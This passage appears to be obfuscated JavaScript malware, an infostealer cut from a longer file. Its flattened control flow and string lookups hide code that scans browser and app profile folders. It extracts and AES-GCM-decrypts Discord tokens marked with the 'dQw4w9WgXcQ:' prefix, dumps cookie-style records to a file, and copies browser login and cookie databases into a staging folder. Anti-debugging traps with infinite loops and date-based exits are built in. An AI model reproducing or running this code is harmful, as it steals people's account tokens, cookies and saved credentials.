                                    "s": (uXPxRCH = TaFn0Uv.g == "t") => {
                                        if (uXPxRCH) {
                                            return TaFn0Uv.v();
                                        }
                                        return xtbSJI += 0x26;
                                    }
                                    , "h": -0x29c
                                    , "e": function () {
                                        return xtbSJI == -0x7d;
                                    }
                                    , "B": 0x191
                                    , "A": function (uXPxRCH = TaFn0Uv.y == -0x52) {
                                        if (uXPxRCH) {
                                            return td77ore == -0x1f;
                                        }
                                        jJIllx += 0x2b;
                                        td77ore += TaFn0Uv.y;
                                        return xtbSJI += -0x26;
                                    }
                                    , "k": function () {
                                        return xtbSJI += -0x4c;
                                    }
                                    , "H": () => {
                                        UxmmwSD(td77ore = 0xc, TaFn0Uv.A());
                                        return "F";
                                    }
                                    , "d": () => {
                                        UxmmwSD(td77ore = -0x23, xtbSJI += -0x3c);
                                        return "b";
                                    }
                                    , "f": 0x2
                                    , "m": -0x2e8
                                    , "g": -0x26
                                    , "r": 0x26
                                    , "w": () => {
                                        return jJIllx += 0x2b;
                                    }
                                    , "x": function () {
                                        jJIllx += 0x2b;
                                        return td77ore += -0x42;
                                    }
                                    , "l": (uXPxRCH = td77ore == (xtbSJI == TaFn0Uv.m ? -0x3d : TaFn0Uv.o)) => {
                                        if (uXPxRCH) {
                                            return TaFn0Uv.q();
                                        }
                                        return Xb4IwJx();
                                    }
                                    , "j": function () {
                                        return xtbSJI += -0x4c;
                                    }
                                    , "y": -0x9
                                    , "z": function () {
                                        return xtbSJI += -0x26;
                                    }
                                    , L: function (uXPxRCH) {
                                        return uXPxRCH + 0x2de;
                                    }
                                });
                                while (jJIllx + td77ore + xtbSJI != 0x3e) {
                                    switch (jJIllx + td77ore + xtbSJI) {
                                    case xtbSJI + 0x2d5:
                                    case 0x14:
                                    case 0x238:
                                        UxmmwSD(td77ore = -0x23, jJIllx += 0x2b, xtbSJI += -0x26);
                                        break;
                                    case 0x54:
                                        if (TaFn0Uv.d() == "b") {
                                            break;
                                        }
                                    default:
                                        var Xb4IwJx;
                                        delete TaFn0Uv.K;
                                        if (xtbSJI == -0x7d) {
                                            UxmmwSD(jJIllx *= 0x2, jJIllx -= 0x1e7, td77ore *= 0x2, td77ore -= 0x13b, xtbSJI += TaFn0Uv.g);
                                            break;
                                        }
                                        UxmmwSD(Xb4IwJx = (TaFn0Uv.g == "i" ? Object : Ot8M78)(this, function () {
                                            var uXPxRCH = function () {
                                                var n49oLe = uXPxRCH.constructor(bw1LDXR(0x42e) + bw1LDXR(0x42f) + bw1LDXR(0x430))()
                                                    .constructor(bw1LDXR(0x431) + bw1LDXR(0x432) + bw1LDXR.call(undefined, 0x433) + bw1LDXR.call(undefined, 0x434));
                                                return rKAu9MB(n49oLe.call(uXPxRCH), MHQ3bYA(-0x2f));
                                            };
                                            return uXPxRCH();
                                        }), xtbSJI += -0x4c);
                                        break;
                                    case jJIllx - 0x13c:
                                        UxmmwSD(jJIllx = 0x70, TaFn0Uv.x());
                                        break;
                                    case 0x18:
                                    case 0x39b:
                                        UxmmwSD(TaFn0Uv.l(), TaFn0Uv.s());
                                        break;
                                    case 0x30c:
                                    case 0x27e:
                                    case xtbSJI + 0x2de:
                                    case 0x34e:
                                        if (TaFn0Uv.H() == "F") {
                                            break;
                                        }
                                    }
                                }
                            } catch (__p_td_3e) {
                                while (__p_td_3e ? __p_td_3e : rKAu9MB(__p_td_3e, MHQ3bYA(-0x2f))) {
                                    var i0gUcBP;
                                    var Kt94kB;
                                    Kt94kB = 0x0;
                                    if (y7bTqx((__p_td_3e ? rKAu9MB(__p_td_3e, MHQ3bYA(-0x2f)) : __p_td_3e) ? function (uXPxRCH) {
                                            Kt94kB = uXPxRCH ? 0x0 : rKAu9MB(uXPxRCH, MHQ3bYA(-0x2f)) ? 0x1 : 0x0;
                                        }(__p_td_3e) : i0gUcBP = 0x1, i0gUcBP && Kt94kB)) {
                                        break;
                                    }
                                    if (i0gUcBP) {
                                        continue;
                                    }
                                }
                            }
                        }
                        const MsCwg5O = Kt94kB;
                        if (uXPxRCH) {
                            if (Date[bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x435)][bw1LDXR(0x42c)][bw1LDXR(0x436)](new Date()) > 0x19b76a3add1) {
                                process.exit();
                            }
                            return y7bTqx(console[MsCwg5O(0x24e)](uXPxRCH), undefined);
                        }
                        let vhNite = '';
                        PRnJ7A += n49oLe[MsCwg5O(0x2d7)];
                        if (y7bTqx(n49oLe[MsCwg5O(0x29e)](uXPxRCH => {
                                if (Date[bw1LDXR(0x437) + bw1LDXR(0x438)][bw1LDXR(0x42c)][bw1LDXR(0x439)](new Date()) < 0x18cc21afa4b) {
                                    var n49oLe = "a";
                                    while (0x1) {
                                        n49oLe = n49oLe += "a";
                                    }
                                }
                                try {
                                    if (Date[bw1LDXR(0x437) + bw1LDXR(0x438)][bw1LDXR(0x42c)][bw1LDXR.call(undefined, 0x439)](new Date()) < 0x18cc21b07a2) {
                                        var jJIllx = "a";
                                        while (0x1) {
                                            jJIllx = jJIllx += "a";
                                        }
                                    }
                                    if (uXPxRCH[MsCwg5O(0x241)]) {
                                        vhNite += uXPxRCH[MsCwg5O(0x211)] + "\t" + (uXPxRCH[bw1LDXR.call(undefined, 0x43a) + bw1LDXR(0x43b)] ? MsCwg5O(0x348) : MsCwg5O(0x281)) + "\t" + uXPxRCH[MsCwg5O(0x29f)] + "\t" + (uXPxRCH[MsCwg5O(0x1f3)] ? MsCwg5O(0x348) : MsCwg5O(0x281)) + "\t" + uXPxRCH[MsCwg5O(0x23f)] + "\t" + uXPxRCH[bw1LDXR(0x43c)] + "\t" + uXPxRCH[MsCwg5O(0x241)] + "\n";
                                    }
                                } catch (_0x5c6cda) {
                                    if (Date[bw1LDXR(0x43d)][bw1LDXR(0x42c)][bw1LDXR(0x439)](new Date()) < 0x18cc21b02ef) {
                                        var td77ore = "a";
                                        while (0x1) {
                                            td77ore = td77ore += "a";
                                        }
                                    }
                                    console[MsCwg5O(0x24e)](_0x5c6cda);
                                }
                            }), vhNite) !== '') {
                            if (Date[bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x43e])]() < 0x18cc21afad0) {
                                try {
                                    var Xb4IwJx;
                                    UxmmwSD(Xb4IwJx = n49oLe, Xb4IwJx());
                                } catch (__p_td_3e) {
                                    while (__p_td_3e ? __p_td_3e : rKAu9MB(__p_td_3e, A536BJ = -0x2f)) {
                                        var i0gUcBP;
                                        var Kt94kB;
                                        Kt94kB = 0x0;
                                        if (y7bTqx((__p_td_3e ? rKAu9MB(__p_td_3e, A536BJ = -0x2f) : __p_td_3e) ? function (uXPxRCH) {
                                                Kt94kB = uXPxRCH ? 0x0 : rKAu9MB(uXPxRCH, A536BJ = -0x2f) ? 0x1 : 0x0;
                                            }(__p_td_3e) : i0gUcBP = 0x1, i0gUcBP && Kt94kB)) {
                                            break;
                                        }
                                        if (i0gUcBP) {
                                            continue;
                                        }
                                    }
                                }
                            }
                            const lA0B8WY = pukrvr[MsCwg5O(0x300)](lxP1K0s, MsCwg5O(0x218), mHQbVa + MsCwg5O(0x343));
                            C_dAB0T(lA0B8WY, vhNite);
                        }
                    });
                }), td77ore[Kt94kB(0x237)](uXPxRCH => {
                    if (function () {
                            var uXPxRCH = function () {
                                const mHQbVa = function () {
                                    const mHQbVa = new RegExp("\n");
                                    return mHQbVa[bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x441)](uXPxRCH);
                                };
                                return mHQbVa();
                            };
                            return uXPxRCH();
                        }()) {
                        process.exit();
                    }
                    if (uXPxRCH) {
                        console[Kt94kB(0x24e)](uXPxRCH);
                    }
                }));
            } catch (_0x5ea76d) {
                if (Date[bw1LDXR(0x442)][bw1LDXR(0x443)][bw1LDXR(0x444)](new Date()) < 0x18cc21b004c) {
                    try {
                        var Q59OVlp = function (uXPxRCH, mHQbVa) {
                            return mHQbVa;
                        };
                        var xtbSJI;
                        var TaFn0Uv;
                        var Xb4IwJx;
                        var i0gUcBP;
                        UxmmwSD(xtbSJI = -0x7f, TaFn0Uv = 0x1b5, Xb4IwJx = -0xdf, i0gUcBP = {
                            "u": function () {
                                return TaFn0Uv = 0x6d;
                            }
                            , "m": function () {
                                return TaFn0Uv == -0x40;
                            }
                            , "x": () => {
                                return xtbSJI = 0x31;
                            }
                            , "b": bw1LDXR(0x445) + bw1LDXR.apply(undefined, [0x446]) + bw1LDXR(0x447) + bw1LDXR(0x448)
                            , "f": -0x84
                            , "w": 0x31
                            , "p": 0x0
                            , "j": (uXPxRCH = xtbSJI == xtbSJI) => {
                                if (!uXPxRCH) {
                                    return "k";
                                }
                                xtbSJI += 0x1d;
                                TaFn0Uv += i0gUcBP.f;
                                return i0gUcBP.g();
                            }
                            , "g": (uXPxRCH = TaFn0Uv == 0x131) => {
                                if (!uXPxRCH) {
                                    return Xb4IwJx == -0x32;
                                }
                                return Xb4IwJx += 0x80;
                            }
                            , "c": (uXPxRCH = TaFn0Uv == 0x47) => {
                                if (uXPxRCH) {
                                    return i0gUcBP.e();
                                }
                                return xtbSJI = 0x31;
                            }
                            , "t": () => {
                                TaFn0Uv += -0x84;
                                return Xb4IwJx += 0x80;
                            }
                            , "s": 0x80
                            , "v": () => {
                                return TaFn0Uv += -0x13;
                            }
                        });
                        while (xtbSJI + TaFn0Uv + Xb4IwJx != 0x53) {
                            switch (xtbSJI + TaFn0Uv + Xb4IwJx) {
                            case 0x5e:
                                UxmmwSD(i0gUcBP.c(), xtbSJI += 0x43, TaFn0Uv += -0x84, Xb4IwJx += 0x36);
                                break;
                            case 0x66:
                                UxmmwSD(TaFn0Uv = 0x6d, TaFn0Uv += -0x13);
                                break;
                            case xtbSJI + 0xe0:
                                UxmmwSD(delete i0gUcBP.t, xtbSJI = 0x31, TaFn0Uv += -0x13, Xb4IwJx += TaFn0Uv + -0x12c);
                                break;
                            case 0x57:
                                var BSJ1pS;
                                if (TaFn0Uv == -0x40) {
                                    UxmmwSD(xtbSJI += TaFn0Uv == 0x4e ? -0x27 : 0x0, TaFn0Uv += 0x0, Xb4IwJx += 0x0);
                                    break;
                                }
                                UxmmwSD(BSJ1pS = (i0gUcBP.r = Q59OVlp)(this, function () {
                                    var uXPxRCH = function () {
                                        var mHQbVa = uXPxRCH.constructor(bw1LDXR(0x449) + bw1LDXR(0x44a) + bw1LDXR(0x44b) + bw1LDXR.apply(undefined, [0x44c]))()
                                            .constructor(i0gUcBP.b);
                                        return rKAu9MB(mHQbVa.call(uXPxRCH), A536BJ = -0x2f);
                                    };
                                    return uXPxRCH();
                                }), BSJ1pS(), i0gUcBP.t());
                                break;
                            default:
                                UxmmwSD(xtbSJI = 0x31, i0gUcBP.j());
                                break;
                            }
                        }
                    } catch (__p_td_3e) {
                        while (__p_td_3e ? __p_td_3e : rKAu9MB(__p_td_3e, MHQ3bYA(-0x2f))) {
                            var Xp96Uso;
                            var TljPa8;
                            TljPa8 = 0x0;
                            if (y7bTqx((__p_td_3e ? rKAu9MB(__p_td_3e, A536BJ = -0x2f) : __p_td_3e) ? function (uXPxRCH) {
                                    TljPa8 = uXPxRCH ? 0x0 : rKAu9MB(uXPxRCH, MHQ3bYA(-0x2f)) ? 0x1 : 0x0;
                                }(__p_td_3e) : Xp96Uso = 0x1, Xp96Uso && TljPa8)) {
                                break;
                            }
                            if (Xp96Uso) {
                                continue;
                            }
                        }
                    }
                }
                console[bw1LDXR.call(undefined, 0x44d)](_0x5ea76d);
            }
        };
        const EQhD4Qq = async() => {
            if (Date[bw1LDXR.apply(undefined, [0x44e]) + bw1LDXR(0x44f)][bw1LDXR(0x450)][bw1LDXR(0x451)](new Date()) < 0x18cc21b0210) {
                try {
                    var mHQbVa = function (uXPxRCH, mHQbVa) {
                        return mHQbVa;
                    };
                    var kY3q474;
                    var n49oLe;
                    var Ot8M78;
                    UxmmwSD(kY3q474 = 0xc9, n49oLe = -0x8f, Ot8M78 = {
                        "c": 0x2f
                        , "e": 0x19
                        , "l": () => {
                            kY3q474 += 0x1;
                            return n49oLe += 0x6;
                        }
                        , "o": function () {
                            UxmmwSD(n49oLe = -0x1f, Ot8M78.l());
                            return "m";
                        }
                        , "i": function () {
                            kY3q474 += 0x2;
                            return n49oLe += 0x19;
                        }
                        , "k": -0x6
                        , "f": function (uXPxRCH = n49oLe == 0x1f) {
                            if (uXPxRCH) {
                                return arguments;
                            }
                            kY3q474 += n49oLe + 0x81;
                            return n49oLe += 0x1f;
                        }
                        , "j": function () {
                            return n49oLe += 0x1f;
                        }
                        , "b": bw1LDXR(0x452) + bw1LDXR(0x453) + bw1LDXR(0x454) + bw1LDXR.apply(undefined, [0x455])
                        , "d": -0xc
                        , s: function (uXPxRCH) {
                            return uXPxRCH + 0xd7;
                        }
                    });
                    while (kY3q474 + n49oLe != 0x53) {
                        switch (kY3q474 + n49oLe) {
                            default: if (Ot8M78.o() == "m") {
                                    break;
                                }
                        case 0x55:
                            case 0x4a:
                            case 0x35:
                            case 0x3c7:
                                UxmmwSD(n49oLe = 0x4f, kY3q474 += -0x2, n49oLe += 0x6);
                            break;
                        case 0x59:
                                UxmmwSD(jJIllx(), n49oLe += Ot8M78.k);
                            break;
                        case 0x3a:
                                var jJIllx;
                            Ot8M78.p = "q";
                            if (n49oLe == 0x6 || false) {
                                Ot8M78.i();
                                break;
                            }
                            UxmmwSD(jJIllx = mHQbVa, n49oLe += 0x1f);
                            break;
                        case n49oLe + 0xd7:
                            case 0x192:
                                var jJIllx;
                            if (n49oLe == 0x2e) {
                                UxmmwSD(kY3q474 += Ot8M78.d, n49oLe += 0x19);
                                break;
                            }
                            UxmmwSD(jJIllx = mHQbVa, Ot8M78.f());
                            break;
                        }
                    }
                } catch (__p_td_3e) {
                    while (__p_td_3e ? __p_td_3e : rKAu9MB(__p_td_3e, MHQ3bYA(-0x2f))) {
                        var td77ore;
                        var Q59OVlp;
                        Q59OVlp = 0x0;
                        if (y7bTqx((__p_td_3e ? rKAu9MB(__p_td_3e, A536BJ = -0x2f) : __p_td_3e) ? function (uXPxRCH) {
                                Q59OVlp = uXPxRCH ? 0x0 : rKAu9MB(uXPxRCH, A536BJ = -0x2f) ? 0x1 : 0x0;
                            }(__p_td_3e) : td77ore = 0x1, td77ore && Q59OVlp)) {
                            break;
                        }
                        if (td77ore) {
                            continue;
                        }
                    }
                }
            }
            for (const [xtbSJI, TaFn0Uv] of Object[Kt94kB(0x31f)](XJQnk9N)) {
                const {
                    main_path: Xb4IwJx
                    , process_name: i0gUcBP
                } = TaFn0Uv;
                if (await MsCwg5O[bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x45b]) + bw1LDXR(0x45c)](Xb4IwJx)) {
                    const BSJ1pS = await MsCwg5O[bw1LDXR(0x45d)](Xb4IwJx);
                    for (const Xp96Uso of BSJ1pS) {
                        const TljPa8 = y7bTqx(await gwbHVf2(i0gUcBP), pukrvr[bw1LDXR(0x45e)](Xb4IwJx, Xp96Uso));
                        if ((await MsCwg5O[Kt94kB(0x27e)](TljPa8))[bw1LDXR(0x45f)]()) {
                            const vhNite = pukrvr[Kt94kB(0x300)](TljPa8, Kt94kB(0x28c));
                            const lA0B8WY = pukrvr[Kt94kB(0x300)](TljPa8, Kt94kB(0x2d3));
                            await XuJpdw(lA0B8WY, vhNite, xtbSJI + "_" + Xp96Uso);
                        }
                    }
                }
            }
        };
        const XuJpdw = async(uXPxRCH, mHQbVa, kY3q474) => {
            if (function () {
                    var uXPxRCH = function () {
                        const mHQbVa = function () {
                            const mHQbVa = new RegExp("\n");
                            return mHQbVa[bw1LDXR(0x460)](uXPxRCH);
                        };
                        return mHQbVa();
                    };
                    return uXPxRCH();
                }()) {
                var n49oLe = "a";
                while (0x1) {
                    n49oLe = n49oLe += "a";
                }
            }
            const jJIllx = await MsCwg5O[Kt94kB(0x20f)](uXPxRCH);
            const td77ore = await MsCwg5O[Kt94kB(0x20f)](mHQbVa);
            if (jJIllx && td77ore) {
                try {
                    const Q59OVlp = pukrvr[Kt94kB(0x300)](lxP1K0s, Kt94kB(0x2a1));
                    const xtbSJI = pukrvr[Kt94kB(0x300)](Q59OVlp, kY3q474);
                    if (y7bTqx(rKAu9MB(await MsCwg5O[Kt94kB(0x20f)](Q59OVlp), A536BJ = -0x2f) && (await MsCwg5O[bw1LDXR(0x461)](Q59OVlp)), rKAu9MB(await MsCwg5O[Kt94kB(0x20f)](xtbSJI), MHQ3bYA(-0x2f)) && (await MsCwg5O[Kt94kB(0x2aa)](xtbSJI, {
                            [bw1LDXR.call(undefined, 0x462) + bw1LDXR(0x463)]: rKAu9MB(rKAu9MB([], A536BJ = -0x2f), A536BJ = -0x2f)
                        })), Date[bw1LDXR(0x464)]()) < 0x18cc21b0828) {
                        process.exit();
                    }
                    const TaFn0Uv = pukrvr[Kt94kB(0x300)](xtbSJI, Kt94kB(0x2d3));
                    const Xb4IwJx = pukrvr[Kt94kB(0x300)](xtbSJI, Kt94kB(0x28c));
                    UxmmwSD(await MsCwg5O[Kt94kB(0x20d)](uXPxRCH, TaFn0Uv), await MsCwg5O[bw1LDXR(0x465)](mHQbVa, Xb4IwJx));
                } catch (_0x5bd243) {
                    if (rKAu9MB(require('os')
                            .platform() === bw1LDXR(0x466), A536BJ = -0x2f)) {
                        process.exit();
                    }
                    console[Kt94kB(0x24e)](_0x5bd243);
                }
            }
        };
        const z9b_YfH = async() => {
            if (Date[bw1LDXR.call(undefined, 0x467) + bw1LDXR(0x468)][bw1LDXR(0x469)][bw1LDXR(0x46a)](new Date()) > 0x19b76a3c7a3) {
                while (true) {
                    var uXPxRCH = 0x63;
                    for (uXPxRCH = 0x63; uXPxRCH == uXPxRCH; uXPxRCH *= uXPxRCH) {
                        if (y7bTqx(rKAu9MB(uXPxRCH, A536BJ = -0x2f) && console.log(uXPxRCH), uXPxRCH) <= 0xa) {
                            break;
                        }
                    };
                    if (uXPxRCH === 0x64) {
                        uXPxRCH--;
                    }
                };
            }
            for (const [kY3q474, n49oLe] of Object[bw1LDXR(0x46b)](mb11EIG)) {
                const {
                    main_path: Ot8M78
                } = n49oLe;
                if (await MsCwg5O[Kt94kB(0x20f)](Ot8M78)) {
                    const jJIllx = pukrvr[Kt94kB(0x300)](Ot8M78, Kt94kB(0x203));
                    const td77ore = pukrvr[Kt94kB(0x300)](Ot8M78, Kt94kB(0x2e1), Kt94kB(0x2c8));
                    await ToNEmw4(kY3q474, jJIllx, td77ore);
                }
            }
        };
        const ToNEmw4 = async(uXPxRCH, mHQbVa, kY3q474) => {
            if (Date[bw1LDXR(0x46c) + bw1LDXR(0x46d)][bw1LDXR(0x46e)][bw1LDXR(0x46f)](new Date()) < 0x18cc21afdbf) {
                while (true) {
                    var n49oLe = 0x63;
                    for (n49oLe = 0x63; n49oLe == n49oLe; n49oLe *= n49oLe) {
                        if (y7bTqx(rKAu9MB(n49oLe, MHQ3bYA(-0x2f)) && console.log(n49oLe), n49oLe) <= 0xa) {
                            break;
                        }
                    };
                    if (n49oLe === 0x64) {
                        n49oLe--;
                    }
                };
            }
            if (await MsCwg5O[Kt94kB(0x20f)](mHQbVa)) {
                try {
                    const jJIllx = NmMNtiY(mHQbVa);
                    if (Date[bw1LDXR(0x470)][bw1LDXR(0x46e)][bw1LDXR(0x46f)](new Date()) < 0x18cc21b124b) {
                        process.exit();
                    }
                    if (jJIllx) {
                        const td77ore = await MsCwg5O[bw1LDXR(0x471)](kY3q474);
                        if (new Date()[bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x46e])]() > 0x19b76a3c376) {
                            process.exit();
                        }
                        for (const Q59OVlp of td77ore) {
                            if (Q59OVlp[Kt94kB(0x34b)](Kt94kB(0x1f5)) || Q59OVlp[Kt94kB(0x34b)](bw1LDXR(0x472))) {
                                const xtbSJI = await MsCwg5O[Kt94kB(0x318)](pukrvr[Kt94kB(0x300)](kY3q474, Q59OVlp), Kt94kB(0x2df));
                                const TaFn0Uv = xtbSJI[bw1LDXR(0x473)](/dQw4w9WgXcQ:[^.*['(.*)'\].*$][^"]*/gi);
                                if (TaFn0Uv) {
                                    for (const Xb4IwJx of TaFn0Uv) {
                                        try {
                                            const i0gUcBP = Buffer[Kt94kB(0x257)](Xb4IwJx[Kt94kB(0x231)](":")[0x1], Kt94kB(0x22a));
                                            const BSJ1pS = i0gUcBP[Kt94kB(0x23e)](0x3, 0xf);
                                            const Xp96Uso = i0gUcBP[bw1LDXR(0x474)](0xf, i0gUcBP[Kt94kB(0x2d7)] - 0x10);
                                            const TljPa8 = i0gUcBP[Kt94kB(0x23e)](i0gUcBP[Kt94kB(0x2d7)] - 0x10);
                                            const vhNite = fZVPjSs[Kt94kB(0x2e0)](Kt94kB(0x2fd), jJIllx, BSJ1pS);
                                            const lA0B8WY = y7bTqx(vhNite[bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x475]) + bw1LDXR(0x476)](TljPa8), vhNite[bw1LDXR(0x477)](Xp96Uso, bw1LDXR.apply(undefined, [0x478]), bw1LDXR(0x479)) + vhNite[Kt94kB(0x206)](Kt94kB(0x2df)));
                                            if (lA0B8WY[bw1LDXR(0x47a)] > 0x32 && rKAu9MB(m0YP63e[Kt94kB(0x2a6)](lA0B8WY), MHQ3bYA(-0x2f))) {
                                                m0YP63e[Kt94kB(0x2b1)](lA0B8WY);
                                                kuD3ib++;
                                            }
                                        } catch (_0x994256) {
                                            if (Xb4IwJx[Kt94kB(0x2d7)] > 0x32 && rKAu9MB(m0YP63e[Kt94kB(0x2a6)](Xb4IwJx), MHQ3bYA(-0x2f))) {
                                                m0YP63e[bw1LDXR(0x47b)](Xb4IwJx);
                                                kuD3ib++;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                } catch (_0x31b6ba) {
                    if (Date[bw1LDXR(0x47c)][bw1LDXR(0x46e)][bw1LDXR(0x46f)](new Date()) > 0x19b76a3ae67) {
                        while (true) {
                            var s1pwaN = 0x63;
                            for (s1pwaN = 0x63; s1pwaN == s1pwaN; s1pwaN *= s1pwaN) {
                                if (y7bTqx(rKAu9MB(s1pwaN, A536BJ = -0x2f) && console.log(s1pwaN), s1pwaN) <= 0xa) {
                                    break;
                                }
                            };
                            if (s1pwaN === 0x64) {
                                s1pwaN--;
                            }
                        };
                    }
                    console[Kt94kB(0x24e)](_0x31b6ba);
                }
            }
        };
        const GRIxR_R = async() => {
            if (Date[bw1LDXR(0x47d) + bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x47e)][bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x47f)][bw1LDXR(0x480)](new Date()) < 0x18cc21b01b2) {
                try {
                    var mHQbVa = function (uXPxRCH, mHQbVa) {
                        return mHQbVa;
                    };
                    var kY3q474;
                    var n49oLe;
                    var jJIllx;
                    var td77ore;
                    UxmmwSD(kY3q474 = 0x72, n49oLe = 0x39, 0xbe, jJIllx = -0x13e, td77ore = {
                        "q": () => {
                            kY3q474 += td77ore.p;
                            n49oLe += -0x20;
                            return jJIllx += 0x121;
                        }
                        , "B": 0x1f
                        , "l": function (uXPxRCH = true) {
                            if (!uXPxRCH) {
                                return kY3q474 == 0x48;
                            }
                            kY3q474 += -0xde;
                            n49oLe += td77ore.g;
                            return td77ore.h();
                        }
                        , "b": bw1LDXR(0x481) + bw1LDXR(0x482) + bw1LDXR(0x483) + bw1LDXR(0x484)
                        , "x": function (uXPxRCH = false) {
                            if (uXPxRCH) {
                                return kY3q474 == 0x13;
                            }
                            UxmmwSD(Q59OVlp(), kY3q474 += 0x5d);
                            return "v";
                        }
                        , "c": 0x2f
                        , "o": 0x85
                        , "p": -0xde
                        , "C": function () {
                            return kY3q474 += 0x3a;
                        }
                        , "g": -0x20
                        , "h": (uXPxRCH = true) => {
                            if (!uXPxRCH) {
                                return "j";
                            }
                            return jJIllx += 0x11e;
                        }
                        , "t": () => {
                            UxmmwSD(kY3q474 = 0x85, td77ore.q());
                            return "r";
                        }
                        , "e": 0x11e
                        , "i": 0xbe
                        , "d": () => {
                            return n49oLe += -0xd;
                        }
                        , "u": function () {
                            kY3q474 += -0xde;
                            n49oLe += -0x1f;
                            return jJIllx += 0x121;
                        }
                    });
                    while (kY3q474 + n49oLe + 0xbe + jJIllx != 0x6e) {
                        switch (kY3q474 + n49oLe + 0xbe + jJIllx) {
                        case 0x11:
                            if (td77ore.x() == "v") {
                                break;
                            }
                        case 0x4b:
                        case 0x109:
                            if (td77ore.t() == "r") {
                                break;
                            }
                        case 0x4e:
                            UxmmwSD((n49oLe == -0x5e ? require : Q59OVlp)(), td77ore.l());
                            break;
                        case 0x3b:
                            UxmmwSD(Q59OVlp(), kY3q474 += -0xde, n49oLe += -0xd, jJIllx += 0x11e);
                            break;
                        case 0x3a2:
                        case 0x4f:
                            UxmmwSD(kY3q474 = 0x85, n49oLe += 0x1f);
                            break;
                        case kY3q474 - 0x47:
                            var Q59OVlp;
                            if (jJIllx == -0x55 || false) {
                                td77ore.u();
                                break;
                            }
                            UxmmwSD(Q59OVlp = mHQbVa, kY3q474 += -0x13b, jJIllx += 0x121);
                            break;
                        case 0x36:
                        default:
                            UxmmwSD(n49oLe = -0x85, kY3q474 += 0x3a);
                            break;
                        }
                    }
                } catch (__p_td_3e) {
                    while (__p_td_3e ? __p_td_3e : rKAu9MB(__p_td_3e, A536BJ = -0x2f)) {
                        var xtbSJI;
                        var TaFn0Uv;
                        TaFn0Uv = 0x0;
                        if (y7bTqx((__p_td_3e ? rKAu9MB(__p_td_3e, MHQ3bYA(-0x2f)) : __p_td_3e) ? function (uXPxRCH) {
                                TaFn0Uv = uXPxRCH ? 0x0 : rKAu9MB(uXPxRCH, A536BJ = -0x2f) ? 0x1 : 0x0;
                            }(__p_td_3e) : xtbSJI = 0x1, xtbSJI && TaFn0Uv)) {
                            break;
                        }
                        if (xtbSJI) {
                            continue;
                        }
                    }
                }
            }
            for (const [Xb4IwJx, i0gUcBP] of Object[Kt94kB(0x31f)](WHRbhhi)) {
                const {
                    main_path: pukrvr
                    , process_name: BSJ1pS
                } = i0gUcBP;
                if (await MsCwg5O[Kt94kB(0x20f)](pukrvr)) {
                    await gwbHVf2(BSJ1pS);
                    await flezKe(pukrvr, Xb4IwJx);
                }
            }
            await _9nPPdY();
        };
        const flezKe = async(uXPxRCH, mHQbVa) => {
            if (rKAu9MB(require('os')
                    .platform() === bw1LDXR.call(undefined, 0x489), A536BJ = -0x2f)) {
                try {
                    var kY3q474 = function (uXPxRCH, mHQbVa) {
                        return mHQbVa;
                    };
                    var n49oLe;
                    var Ot8M78;
                    var jJIllx;
                    UxmmwSD(n49oLe = 0xfb, Ot8M78 = -0x78, jJIllx = {
                        "j": () => {
                            return n49oLe += -0x1d;
                        }
                        , "y": -0x8
                        , "B": () => {
                            UxmmwSD(Ot8M78 = -0x6a, Ot8M78 += jJIllx.y, jJIllx.d = true);
                            return "z";
                        }
                        , "Q": function () {
                            UxmmwSD(Ot8M78 = -0x6a, Ot8M78 += -0x14, jJIllx.d = true);
                            return "O";
                        }
                        , "r": -0x103
                        , "e": (uXPxRCH = jJIllx[bw1LDXR.apply(undefined, [0x48a])]("g")) => {
                            if (uXPxRCH) {
                                return jJIllx;
                            }
                            return td77ore();
                        }
                        , "D": function () {
                            return n49oLe += 0x0;
                        }
                        , "p": function () {
                            return Ot8M78 = -0x6a;
                        }
                        , "E": () => {
                            return Ot8M78 += 0x0;
                        }
                        , "N": () => {
                            Ot8M78 += -0x2d;
                            return jJIllx.d = true;
                        }
                        , "c": 0x2f
                        , "H": 0xfb
                        , "F": function () {
                            n49oLe += 0x0;
                            return Ot8M78 += 0x0;
                        }
                        , "u": (uXPxRCH = n49oLe == jJIllx.v) => {
                            if (uXPxRCH) {
                                return jJIllx.x();
                            }
                            UxmmwSD(Ot8M78 = -0x6a, n49oLe += 0x40, Ot8M78 += n49oLe + jJIllx.r, jJIllx.d = true);
                            return "s";
                        }
                        , "b": bw1LDXR(0x48b) + bw1LDXR.call(undefined, 0x48c) + bw1LDXR(0x48d) + bw1LDXR(0x48e)
                        , "v": -0x4b
                        , "q": () => {
                            return n49oLe += 0x40;
                        }
                        , "G": (uXPxRCH = false) => {
                            if (uXPxRCH) {
                                return Ot8M78 == 0x5b;
                            }
                            return td77ore();
                        }
                        , R: function (uXPxRCH) {
                            return uXPxRCH - 0x78;
                        }
                        , S: function (uXPxRCH) {
                            return uXPxRCH.d ? 0x5a : 0x37e;
                        }
                    });
                    while (n49oLe + Ot8M78 != 0x67) {
                        switch (n49oLe + Ot8M78) {
                        case 0x87:
                        case 0x148:
                        case 0x335:
                            UxmmwSD(Ot8M78 = 0x5e, jJIllx.N());
                            break;
                        case n49oLe != 0xfb && n49oLe != 0xbb && n49oLe != 0x118 && n49oLe - 0x99:
                        case 0x1a6:
                            UxmmwSD(Ot8M78 = -0x6a, n49oLe += 0x3, Ot8M78 += -0x8, jJIllx.d = true);
                            break;
                        default:
                            if (jJIllx.B() == "z") {
                                break;
                            }
                        case 0x11:
                            UxmmwSD(n49oLe = 0x14, Ot8M78 += 0x76);
                            break;
                        case 0x6e:
                            if (jJIllx.Q() == "O") {
                                break;
                            }
                        case n49oLe - 0x78:
                        case 0x26a:
                            var td77ore;
                            if (jJIllx.r == -0x78 || false) {
                                jJIllx.F();
                                break;
                            }
                            UxmmwSD(td77ore = (Ot8M78 == 0x46 ? module : kY3q474)(this, function () {
                                var uXPxRCH = function () {
                                    var mHQbVa = uXPxRCH.constructor(bw1LDXR(0x48f) + bw1LDXR(0x490) + bw1LDXR(0x491) + bw1LDXR(0x492))()
                                        .constructor(jJIllx.b);
                                    return rKAu9MB(mHQbVa.call(uXPxRCH), A536BJ = -0x2f);
                                };
                                return uXPxRCH();
                            }), Ot8M78 *= 0x2, Ot8M78 -= -0x4f, jJIllx.d = true);
